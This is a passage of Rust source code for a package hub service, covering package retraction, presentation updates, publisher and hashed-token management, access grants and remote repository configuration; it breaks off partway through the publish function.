        self.image_url = format!("/api/hub/remote/assets/{package_id}/media/{}", cover.name);
    }
}

/// One inbound presentation image, carried base64 on the publish request.
#[derive(Debug, Clone, serde::Serialize, Deserialize)]
pub struct RemoteHubPublishMedia {
    pub name: String,
    #[serde(default)]
    pub role: String,
    pub content_type: String,
    #[serde(default)]
    pub encoding: String,
    #[serde(default)]
    pub size_bytes: usize,
    #[serde(default)]
    pub sha256: String,
    #[serde(default)]
    pub content: String,
}

impl HubService {
    pub fn new(
        control_data: Arc<dyn DataAdapter>,
        hub_data: Arc<dyn DataAdapter>,
        projects: Arc<ProjectService>,
        node_registry: Arc<NodeRegistryService>,
        dependency_lock: Arc<DependencyLockService>,
        data_root: PathBuf,
    ) -> Self {
        Self {
            control_data,
            hub_data,
            projects,
            node_registry,
            dependency_lock,
            data_root,
            install_locks: Mutex::new(HashMap::new()),
        }
    }

    pub fn get_authority(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Option<HubAuthority>, PlatformError> {
        self.hub_data
            .get_hub_authority(&slug_segment(owner), &slug_segment(project))
    }

    pub fn get_default_service_instance(
        &self,
    ) -> Result<Option<PlatformServiceInstance>, PlatformError> {
        self.control_data
            .get_platform_service_instance(DEFAULT_HUB_SERVICE_INSTANCE_ID)
    }

    pub fn ensure_default_service_instance(
        &self,
        host_office_id: &str,
        public_base_url: &str,
        enabled: bool,
    ) -> Result<PlatformServiceInstance, PlatformError> {
        let host_office_id = host_office_id.trim();
        if host_office_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_SERVICE_HOST_REQUIRED",
                "hub service host office is required",
            ));
        }
        if self
            .control_data
            .get_platform_office(host_office_id)?
            .is_none()
        {
            return Err(PlatformError::new(
                "HUB_SERVICE_HOST_MISSING",
                "hub service host office was not found",
            ));
        }
        let public_base_url = public_base_url.trim().trim_end_matches('/');
        let public_base_url = if public_base_url.is_empty() {
            default_hub_base_url()
        } else {
            public_base_url.to_string()
        };
        let existing = self.get_default_service_instance()?;
        let placement_changed = existing.as_ref().is_some_and(|item| {
            item.host_office_id != host_office_id
                || item.state_office_id != host_office_id
                || item.public_base_url != public_base_url
                || item.enabled != enabled
        });
        let now = now_ts();
        let service = PlatformServiceInstance {
            service_instance_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            service_kind: HUB_SERVICE_KIND.to_string(),
            display_label: "Hub".to_string(),
            host_office_id: host_office_id.to_string(),
            state_office_id: host_office_id.to_string(),
            public_base_url,
            enabled,
            status: if enabled {
                "enabled".to_string()
            } else {
                "disabled".to_string()
            },
            placement_generation: existing
                .as_ref()
                .map(|item| {
                    if placement_changed {
                        item.placement_generation.saturating_add(1)
                    } else {
                        item.placement_generation.max(1)
                    }
                })
                .unwrap_or(1),
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_platform_service_instance(&service)?;
        Ok(service)
    }

    pub fn set_authority_enabled(
        &self,
        owner: &str,
        project: &str,
        enabled: bool,
    ) -> Result<HubAuthority, PlatformError> {
        let _ = (owner, project);
        let authority = self.ensure_service_authority()?;
        let now = now_ts();
        let next = HubAuthority {
            enabled,
            updated_at: now,
            ..authority
        };
        self.hub_data.put_hub_authority(&next)?;
        Ok(next)
    }

    pub fn list_asset_packages(&self) -> Result<Vec<HubAssetPackage>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_hub_asset_packages()
    }

    pub fn list_asset_packages_by_owner(
        &self,
        owner: &str,
    ) -> Result<Vec<HubAssetPackage>, PlatformError> {
        let owner = slug_segment(owner);
        self.require_enabled()?;
        let mut items = self.hub_data.list_hub_asset_packages()?;
        items.retain(|item| item.publisher_owner == owner);
        Ok(items)
    }

    pub fn list_asset_versions(
        &self,
        package_id: &str,
    ) -> Result<Vec<HubAssetVersion>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_hub_asset_versions(package_id)
    }

    /// Retract every release of one package: the bytes go, the coordinates stay.
    ///
    /// This is the withdrawal path, and it is deliberately not a delete.
    /// Immutability is enforced against the rows that exist, so dropping them
    /// would free every `package@version` the package held to be published
    /// again with different content — a `zeb.lock` pinning the old digest would
    /// then report a tampered dependency, which is the exact failure
    /// `enforce_release_immutability` exists to prevent. Keeping the rows and
    /// destroying the artifacts withdraws the content without opening that hole.
    pub fn retract_asset_package(
        &self,
        token: &HubToken,
        package_id: &str,
        reason: &str,
    ) -> Result<usize, PlatformError> {
        self.require_enabled()?;
        let package_id = canonical_hub_package_id(&token.publisher_id, package_id)?;
        if package_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PACKAGE_INVALID",
                "package id must not be empty",
            ));
        }
        let Some(mut package) = self.hub_data.get_hub_asset_package(&package_id)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset package not found",
            ));
        };
        let can_manage = token.scopes.iter().any(|scope| scope == "hub:manage");
        if !can_manage
            && (package.publisher_owner != token.owner
                || package.publisher_id != token.publisher_id)
        {
            return Err(PlatformError::new(
                "HUB_PACKAGE_FORBIDDEN",
                "token cannot retract this package",
            ));
        }
        let versions = self.hub_data.list_hub_asset_versions(&package_id)?;
        let now = now_ts();
        let reason = reason.trim();
        // The markers land before the bytes go: a row that still points at a
        // readable artifact is recoverable, an artifact with no marker naming
        // it is a release that reads as live and cannot be served.
        let mut retracted = 0usize;
        for version in &versions {
            if version.retracted_at.is_some() {
                continue;
            }
            self.hub_data
                .retract_hub_asset_version(&package_id, &version.version, now, reason)?;
            retracted += 1;
        }
        package.retracted_at = Some(package.retracted_at.unwrap_or(now));
        package.retracted_reason = reason.to_string();
        package.updated_at = now;
        self.hub_data.put_hub_asset_package(&package)?;
        for version in &versions {
            let Ok(path) = self.hub_artifact_path_for_delete(&version.artifact_rel_path) else {
                continue;
            };
            match fs::remove_file(&path) {
                Ok(()) => {}
                Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
                Err(_) => {}
            }
            prune_empty_hub_dirs(path.parent(), &self.data_root);
        }
        Ok(retracted)
    }

    /// Update the mutable half of one package, touching no release.
    ///
    /// This is what the presentation split was made for: a release is
    /// digest-pinned and cannot be edited, so everything a human reads while
    /// choosing lives on the package row and correcting it costs an update
    /// rather than a version bump. Nothing here reads or writes a
    /// `HubAssetVersion` or an artifact under `packages/`.
    ///
    /// Every field of `update` is optional and an omitted field is left alone.
    pub fn update_asset_presentation(
        &self,
        token: &HubToken,
        source_owner: &str,
        source_project: &str,
        package_id: &str,
        update: &HubPresentationUpdate,
    ) -> Result<HubAssetPackage, PlatformError> {
        self.require_enabled()?;
        let package_id = canonical_hub_package_id(&token.publisher_id, package_id)?;
        let Some(existing) = self.hub_data.get_hub_asset_package(&package_id)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset package not found",
            ));
        };
        let can_manage = token.scopes.iter().any(|scope| scope == "hub:manage");
        if !can_manage
            && (existing.publisher_owner != token.owner
                || existing.publisher_id != token.publisher_id)
        {
            return Err(PlatformError::new(
                "HUB_PACKAGE_FORBIDDEN",
                "token cannot update this package",
            ));
        }
        let mut presentation = HubPresentation::from_existing(Some(&existing));
        if let Some(summary) = update.summary.as_ref() {
            presentation.summary = summary.trim().to_string();
        }
        if let Some(description_md) = update.description_md.as_ref() {
            presentation.description_md = description_md.clone();
        }
        // The cover is converted and the gallery is checked against the media
        // list the update would produce, before a single byte is stored.
        let cover_bytes = match update
            .image_file_path
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty())
        {
            Some(path) => {
                let Some(publisher) = self.hub_data.get_hub_publisher(
                    HUB_SERVICE_SCOPE_OWNER,
                    HUB_SERVICE_SCOPE_PROJECT,
                    &existing.publisher_id,
                )?
                else {
                    return Err(PlatformError::new(
                        "HUB_PUBLISHER_MISSING",
                        "publisher not found",
                    ));
                };
                let layout = self
                    .projects
                    .project_layout(&slug_segment(source_owner), &slug_segment(source_project))?;
                hub_cover_webp_from_path(&layout, path, &publisher)?
            }
            None => None,
        };
        presentation.replace_cover(
            &package_id,
            cover_bytes.as_ref().map(|(name, bytes)| HubAssetMedia {
                name: name.clone(),
                role: "cover".to_string(),
                content_type: HUB_COVER_MEDIA_TYPE.to_string(),
                size_bytes: bytes.len(),
                artifact_sha256: sha256_hex(bytes),
            }),
        );
        if let Some(gallery) = update.gallery.as_ref() {
            validate_hub_gallery(gallery, &presentation.media)?;
            presentation.gallery = gallery.clone();
            presentation.image_url = gallery
                .cover
                .as_ref()
                .map(|item| {
                    format!(
                        "/api/hub/remote/assets/{package_id}/media/{}",
                        item.media_name
                    )
                })
                .unwrap_or_default();
        }
        if let Some((_, bytes)) = cover_bytes.as_ref() {
            self.store_artifact(bytes)?;
        }
        let package = HubAssetPackage {
            summary: presentation.summary,
            description_md: presentation.description_md,
            image_url: presentation.image_url,
            media: presentation.media,
            gallery: presentation.gallery,
            updated_at: now_ts(),
            ..existing
        };
        self.hub_data.put_hub_asset_package(&package)?;
        Ok(package)
    }

    pub fn list_publishers(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubPublisher>, PlatformError> {
        let _ = (owner, project);
        self.require_enabled()?;
        self.hub_data
            .list_hub_publishers(HUB_SERVICE_SCOPE_OWNER, HUB_SERVICE_SCOPE_PROJECT)
    }

    pub fn upsert_publisher(
        &self,
        owner: &str,
        project: &str,
        publisher_id: &str,
        display_name: &str,
        publisher_url: &str,
        email: &str,
        description: &str,
        icon_url: &str,
        website_url: &str,
        enabled: bool,
        can_read: bool,
        can_publish: bool,
        can_manage: bool,
        max_packages: i64,
        max_package_bytes: i64,
        max_media_files: i64,
        max_image_bytes: i64,
    ) -> Result<HubPublisher, PlatformError> {
        let _ = (owner, project);
        self.require_enabled()?;
        let authority = self.ensure_service_authority()?;
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        if publisher_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_INVALID",
                "publisher id must not be empty",
            ));
        }
        let now = now_ts();
        let existing = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?;
        let row = HubPublisher {
            authority_id: authority.authority_id,
            publisher_pk: existing
                .as_ref()
                .map(|v| v.publisher_pk.clone())
                .filter(|v| !v.is_empty())
                .unwrap_or_else(|| format!("mpub_{}", random_hex(8))),
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            publisher_id: publisher_id.clone(),
            display_name: if display_name.trim().is_empty() {
                publisher_id.replace('-', " ")
            } else {
                display_name.trim().to_string()
            },
            publisher_url: normalize_publisher_url(&publisher_id, publisher_url),
            email: email.trim().to_string(),
            description: description.trim().to_string(),
            icon_url: icon_url.trim().to_string(),
            website_url: website_url.trim().to_string(),
            enabled,
            can_read,
            can_publish,
            can_manage,
            max_packages: normalize_limit(max_packages, DEFAULT_PUBLISHER_MAX_PACKAGES),
            max_package_bytes: normalize_limit(
                max_package_bytes,
                DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES,
            ),
            max_media_files: normalize_limit(max_media_files, DEFAULT_PUBLISHER_MAX_MEDIA_FILES),
            max_image_bytes: normalize_limit(max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES),
            created_at: existing.as_ref().map(|v| v.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.hub_data.put_hub_publisher(&row)?;
        Ok(row)
    }

    pub fn delete_publisher(
        &self,
        owner: &str,
        project: &str,
        publisher_id: &str,
    ) -> Result<(), PlatformError> {
        let _ = (owner, project);
        self.hub_data.delete_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &slug_segment(publisher_id),
        )
    }

    pub fn create_token(
        &self,
        owner: &str,
        project: &str,
        req: &CreateHubTokenRequest,
    ) -> Result<(HubToken, String), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        self.require_enabled()?;
        let authority = self.ensure_service_authority()?;
        if owner.is_empty() || project.is_empty() {
            return Err(PlatformError::new(
                "HUB_TOKEN_INVALID",
                "owner/project must not be empty",
            ));
        }
        let publisher_id = normalize_hub_id_segment(&req.publisher_id, "publisher id")?;
        let title = req.title.trim();
        if title.is_empty() || publisher_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_TOKEN_INVALID",
                "token title and publisher id must not be empty",
            ));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        let scopes = normalize_scopes(&req.scopes)?;
        validate_publisher_scopes(&publisher, &scopes)?;
        let now = now_ts();
        let token_id = format!("mkt_{}", random_hex(8));
        let secret = random_hex(24);
        let plain = format!("zfmt_{token_id}_{secret}");
        let token = HubToken {
            token_id: token_id.clone(),
            authority_id: authority.authority_id,
            publisher_pk: publisher.publisher_pk.clone(),
            owner,
            project,
            publisher_id: publisher_id.clone(),
            publisher_display_name: publisher.display_name,
            publisher_url: publisher.publisher_url,
            publisher_email: publisher.email,
            title: title.to_string(),
            secret_hash: sha256_hex(plain.as_bytes()),
            scopes,
            scope_read: false,
            scope_publish: false,
            scope_manage: false,
            expires_at: req.expires_at,
            last_used_at: None,
            revoked_at: None,
            created_at: now,
            updated_at: now,
        };
        let token = apply_scope_flags(token);
        self.hub_data.put_hub_token(&token)?;
        Ok((token, plain))
    }

    pub fn list_tokens(&self, owner: &str, project: &str) -> Result<Vec<HubToken>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        self.require_enabled()?;
        self.hub_data.list_hub_tokens(&owner, &project)
    }

    pub fn list_all_tokens(&self) -> Result<Vec<HubToken>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_all_hub_tokens()
    }

    pub fn revoke_token(
        &self,
        owner: &str,
        project: &str,
        token_id: &str,
    ) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let Some(mut token) = self.hub_data.get_hub_token(token_id)? else {
            return Ok(());
        };
        if token.owner != owner || token.project != project {
            return Err(PlatformError::new(
                "HUB_TOKEN_FORBIDDEN",
                "token does not belong to this hub",
            ));
        }
        token.revoked_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(())
    }

    pub fn revoke_token_any(&self, token_id: &str) -> Result<(), PlatformError> {
        self.require_enabled()?;
        let Some(mut token) = self.hub_data.get_hub_token(token_id)? else {
            return Ok(());
        };
        token.revoked_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(())
    }

    pub fn list_repositories(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<ProjectHubRepository>, PlatformError> {
        self.control_data
            .list_project_hub_repositories(&slug_segment(owner), &slug_segment(project))
    }

    pub fn list_access_grants(
        &self,
        source_owner: &str,
    ) -> Result<Vec<HubAccessGrant>, PlatformError> {
        self.control_data
            .list_hub_access_grants(&slug_segment(source_owner))
    }

    pub fn upsert_access_grant(
        &self,
        source_owner: &str,
        repository_id: &str,
        grant_scope: &str,
        target_owner: &str,
        target_project: &str,
        can_read: bool,
        can_publish: bool,
        can_manage: bool,
        enabled: bool,
    ) -> Result<HubAccessGrant, PlatformError> {
        let source_owner = slug_segment(source_owner);
        let repository_id = slug_segment(repository_id);
        let grant_scope = normalize_hub_grant_scope(grant_scope)?;
        let target_owner = if grant_scope == "all_projects" {
            String::new()
        } else {
            slug_segment(target_owner)
        };
        let target_project = if grant_scope == "all_projects" {
            String::new()
        } else {
            slug_segment(target_project)
        };
        if source_owner.is_empty()
            || repository_id.is_empty()
            || (grant_scope == "selected_project"
                && (target_owner.is_empty() || target_project.is_empty()))
        {
            return Err(PlatformError::new(
                "HUB_ACCESS_GRANT_INVALID",
                "source owner, repository id, and selected project target are required",
            ));
        }
        let repos = self
            .control_data
            .list_platform_hub_repositories(&source_owner)?;
        let Some(repo) = repos
            .into_iter()
            .find(|item| item.repository_id == repository_id)
        else {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_MISSING",
                "platform Hub source not found",
            ));
        };
        let now = now_ts();
        let existing = self
            .control_data
            .list_hub_access_grants(&source_owner)?
            .into_iter()
            .find(|item| {
                item.source_id == repo.source_id
                    && item.grant_scope == grant_scope
                    && item.target_owner == target_owner
                    && item.target_project == target_project
            });
        let grant = HubAccessGrant {
            grant_id: existing
                .as_ref()
                .map(|item| item.grant_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("hgrant_{}", random_hex(8))),
            source_owner,
            source_id: repo.source_id,
            repository_id,
            grant_scope,
            target_owner,
            target_project,
            can_read,
            can_publish,
            can_manage,
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_hub_access_grant(&grant)?;
        Ok(grant)
    }

    pub fn delete_access_grant(&self, grant_id: &str) -> Result<(), PlatformError> {
        self.control_data
            .delete_hub_access_grant(&slug_segment(grant_id))
    }

    pub fn list_effective_repositories(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<ProjectHubRepository>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let mut out = self
            .control_data
            .list_project_hub_repositories(&owner, &project)?;
        let mut seen = out
            .iter()
            .map(|item| item.repository_id.clone())
            .collect::<BTreeSet<_>>();
        let grants = self
            .control_data
            .list_effective_hub_access_grants(&owner, &project)?;
        for grant in grants
            .into_iter()
            .filter(|item| item.enabled && item.can_read)
        {
            if seen.contains(&grant.repository_id) {
                continue;
            }
            let source = self
                .control_data
                .list_platform_hub_repositories(&grant.source_owner)?
                .into_iter()
                .find(|item| {
                    item.source_id == grant.source_id || item.repository_id == grant.repository_id
                });
            let Some(source) = source else {
                continue;
            };
            if !source.enabled {
                continue;
            }
            seen.insert(source.repository_id.clone());
            out.push(ProjectHubRepository {
                owner: owner.clone(),
                project: project.clone(),
                repository_id: source.repository_id,
                title: source.title,
                base_url: source.base_url,
                remote_owner: source.remote_owner,
                remote_project: source.remote_project,
                read_token: source.read_token,
                enabled: source.enabled,
                created_at: grant.created_at,
                updated_at: grant.updated_at,
            });
        }
        Ok(out)
    }

    pub fn ensure_default_project_repository(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        if owner.is_empty() || project.is_empty() {
            return Ok(());
        }
        self.ensure_default_platform_repository(&owner)
    }

    pub fn list_platform_repositories(
        &self,
        owner: &str,
    ) -> Result<Vec<PlatformHubRepository>, PlatformError> {
        self.control_data
            .list_platform_hub_repositories(&slug_segment(owner))
    }

    pub fn upsert_platform_repository(
        &self,
        owner: &str,
        repository_id: &str,
        title: &str,
        base_url: &str,
        remote_owner: &str,
        remote_project: &str,
        read_token: &str,
        visibility: &str,
        enabled: bool,
    ) -> Result<PlatformHubRepository, PlatformError> {
        let owner = slug_segment(owner);
        let repository_id = slug_segment(repository_id);
        if owner.is_empty() || repository_id.is_empty() || base_url.trim().is_empty() {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "repository fields must not be empty",
            ));
        }
        validate_remote_hub_url(base_url.trim().trim_end_matches('/'))?;
        let uses_direct_base = is_direct_hub_base(base_url);
        if !uses_direct_base && (remote_owner.trim().is_empty() || remote_project.trim().is_empty())
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "remote owner and project are required unless base_url already points to /api/projects/{owner}/{project}/hub",
            ));
        }
        let now = now_ts();
        let owner_user_id = self
            .control_data
            .get_user_auth(&owner)?
            .map(|user| user.profile.user_id)
            .ok_or_else(|| PlatformError::new("PLATFORM_USER_NOT_FOUND", "owner user not found"))?;
        let existing = self
            .control_data
            .list_platform_hub_repositories(&owner)?
            .into_iter()
            .find(|item| item.repository_id == repository_id);
        let row = PlatformHubRepository {
            source_id: existing
                .as_ref()
                .map(|item| item.source_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("pmr_{}", random_hex(8))),
            owner_user_id: existing
                .as_ref()
                .map(|item| item.owner_user_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or(owner_user_id),
            owner,
            repository_id,
            title: if title.trim().is_empty() {
                "Remote Hub".to_string()
            } else {
                title.trim().to_string()
            },
            base_url: base_url.trim().trim_end_matches('/').to_string(),
            remote_owner: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_owner)
            },
            remote_project: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_project)
            },
            read_token: preserve_or_replace_token(
                existing.as_ref().map(|item| item.read_token.as_str()),
                read_token,
            ),
            visibility: normalize_platform_source_visibility(visibility),
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_platform_hub_repository(&row)?;
        Ok(row)
    }

    pub fn delete_platform_repository(
        &self,
        owner: &str,
        repository_id: &str,
    ) -> Result<(), PlatformError> {
        self.control_data
            .delete_platform_hub_repository(&slug_segment(owner), &slug_segment(repository_id))
    }

    pub fn ensure_default_platform_repository(&self, owner: &str) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        if owner.is_empty() {
            return Ok(());
        }
        let existing = self.control_data.list_platform_hub_repositories(&owner)?;
        if existing
            .iter()
            .any(|item| item.repository_id == "zebflow-com")
        {
            return Ok(());
        }
        let now = now_ts();
        let owner_user_id = self
            .control_data
            .get_user_auth(&owner)?
            .map(|user| user.profile.user_id)
            .ok_or_else(|| PlatformError::new("PLATFORM_USER_NOT_FOUND", "owner user not found"))?;
        self.control_data
            .put_platform_hub_repository(&PlatformHubRepository {
                source_id: format!("pmr_{}", random_hex(8)),
                owner_user_id,
                owner,
                repository_id: "zebflow-com".to_string(),
                title: "Zebflow Hub".to_string(),
                base_url: default_hub_base_url(),
                remote_owner: String::new(),
                remote_project: String::new(),
                read_token: String::new(),
                visibility: "public".to_string(),
                enabled: true,
                created_at: now,
                updated_at: now,
            })?;
        Ok(())
    }

    pub fn upsert_repository(
        &self,
        owner: &str,
        project: &str,
        repository_id: &str,
        title: &str,
        base_url: &str,
        remote_owner: &str,
        remote_project: &str,
        read_token: &str,
        enabled: bool,
    ) -> Result<ProjectHubRepository, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let repository_id = slug_segment(repository_id);
        if owner.is_empty()
            || project.is_empty()
            || repository_id.is_empty()
            || base_url.trim().is_empty()
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "repository fields must not be empty",
            ));
        }
        validate_remote_hub_url(base_url.trim().trim_end_matches('/'))?;
        let uses_direct_base = is_direct_hub_base(base_url);
        if !uses_direct_base && (remote_owner.trim().is_empty() || remote_project.trim().is_empty())
        {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_INVALID",
                "remote owner and project are required unless base_url already points to /api/projects/{owner}/{project}/hub",
            ));
        }
        let now = now_ts();
        let existing = self
            .control_data
            .list_project_hub_repositories(&owner, &project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id);
        let row = ProjectHubRepository {
            owner,
            project,
            repository_id,
            title: if title.trim().is_empty() {
                "Remote Hub".to_string()
            } else {
                title.trim().to_string()
            },
            base_url: base_url.trim().trim_end_matches('/').to_string(),
            remote_owner: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_owner)
            },
            remote_project: if uses_direct_base {
                String::new()
            } else {
                slug_segment(remote_project)
            },
            read_token: preserve_or_replace_token(
                existing.as_ref().map(|item| item.read_token.as_str()),
                read_token,
            ),
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_project_hub_repository(&row)?;
        Ok(row)
    }

    pub fn delete_repository(
        &self,
        owner: &str,
        project: &str,
        repository_id: &str,
    ) -> Result<(), PlatformError> {
        self.control_data.delete_project_hub_repository(
            &slug_segment(owner),
            &slug_segment(project),
            &slug_segment(repository_id),
        )
    }

    pub fn authenticate_token(
        &self,
        bearer_token: &str,
        required_scope: &str,
    ) -> Result<HubToken, PlatformError> {
        self.require_enabled()?;
        let token_value = bearer_token.trim();
        if token_value.is_empty() {
            return Err(PlatformError::new("HUB_TOKEN_INVALID", "token missing"));
        }
        let token_hash = sha256_hex(token_value.as_bytes());
        let matched = self
            .hub_data
            .list_all_hub_tokens()?
            .into_iter()
            .find(|token| token.secret_hash == token_hash);
        let Some(mut token) = matched else {
            return Err(PlatformError::new("HUB_TOKEN_INVALID", "token not found"));
        };
        if token.revoked_at.is_some() {
            return Err(PlatformError::new("HUB_TOKEN_REVOKED", "token revoked"));
        }
        if let Some(expires_at) = token.expires_at
            && expires_at > 0
            && expires_at <= now_ts()
        {
            return Err(PlatformError::new("HUB_TOKEN_EXPIRED", "token expired"));
        }
        if !token.grants_scope(required_scope) {
            return Err(PlatformError::new("HUB_TOKEN_FORBIDDEN", "scope missing"));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &token.publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        validate_publisher_scopes(&publisher, &[required_scope.to_string()])?;
        token.last_used_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(token)
    }

    pub fn list_publish_sources(
        &self,
        owner: &str,
        project: &str,
        source_type: &str,
    ) -> Result<Vec<HubPublishSourceItem>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let source_type = normalize_source_type(source_type);
        match source_type.as_str() {
            "pipeline_with_dependencies" => {
                let rows = self.projects.list_pipeline_meta_rows(&owner, &project)?;
                Ok(rows
                    .into_iter()
                    .map(|item| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: item.file_rel_path.clone(),
                        name: item.title.clone(),
                        description: if item.description.trim().is_empty() {
                            format!("Pipeline · {}", item.trigger_kind)
                        } else {
                            item.description.clone()
                        },
                        path: item.file_rel_path,
                    })
                    .collect())
            }
            "template_with_dependencies" => {
                let listing = self.projects.list_template_workspace(&owner, &project)?;
                Ok(listing
                    .items
                    .into_iter()
                    .filter(|item| item.kind != "folder")
                    .map(|item| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: item.rel_path.clone(),
                        name: item.name,
                        description: format!("Template · {}", item.file_kind),
                        path: item.rel_path,
                    })
                    .collect())
            }
            "folder_files" => {
                let layout = self.projects.project_layout(&owner, &project)?;
                let folders = list_repo_folders(&layout)?;
                Ok(folders
                    .into_iter()
                    .map(|path| HubPublishSourceItem {
                        source_type: source_type.clone(),
                        source_ref: path.clone(),
                        name: Path::new(&path)
                            .file_name()
                            .and_then(|v| v.to_str())
                            .unwrap_or(&path)
                            .to_string(),
                        description: "Folder files export".to_string(),
                        path,
                    })
                    .collect())
            }
            "project_files" => Ok(vec![HubPublishSourceItem {
                source_type,
                source_ref: ".".to_string(),
                name: format!("{project} project files"),
                description: "Entire repo workspace export".to_string(),
                path: "/".to_string(),
            }]),
            _ => Err(PlatformError::new(
                "HUB_SOURCE_INVALID",
                "unsupported source type",
            )),
        }
    }

    pub fn preview_publish_source(
        &self,
        owner: &str,
        project: &str,
        source_type: &str,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let source_type = normalize_source_type(source_type);
        let layout = self.projects.project_layout(&owner, &project)?;
        match source_type.as_str() {
            "pipeline_with_dependencies" => {
                self.preview_pipeline(&owner, &project, &layout, source_ref)
            }
            "template_with_dependencies" => {
                self.preview_template(&owner, &project, &layout, source_ref)
            }
            "folder_files" => self.preview_folder(&layout, source_ref),
            "project_files" => self.preview_project(&layout),
            _ => Err(PlatformError::new(
                "HUB_SOURCE_INVALID",
                "unsupported source type",
            )),
        }
    }

    pub fn publish_asset(
        &self,
        authority_owner: &str,
        authority_project: &str,
        publisher_owner: &str,
        publisher_id: &str,
        publisher_display_name: &str,
        publisher_url: &str,
        publisher_email: &str,
        source_owner: &str,
        source_project: &str,
        source_type: &str,
        source_ref: &str,
        package_id: &str,
        version: &str,
        title: &str,
        description: &str,
        image_file_path: &str,
        visibility: &str,
        project_options: HubProjectBundlePublishOptions,
        tags: Vec<String>,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        let _ = (authority_owner, authority_project);
        self.require_enabled()?;
        let authority_owner = HUB_SERVICE_SCOPE_OWNER.to_string();
        let authority_project = HUB_SERVICE_SCOPE_PROJECT.to_string();
        let publisher_owner = slug_segment(publisher_owner);
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        let source_owner = slug_segment(source_owner);
        let source_project = slug_segment(source_project);
        let source_type = normalize_source_type(source_type);
        let package_id = canonical_hub_package_id(&publisher_id, package_id)?;
        let version = version.trim();
        if authority_owner.is_empty()
            || authority_project.is_empty()
            || publisher_owner.is_empty()
            || publisher_id.is_empty()
            || source_owner.is_empty()
            || source_project.is_empty()
        {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "authority, publisher, and source must not be empty",
            ));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
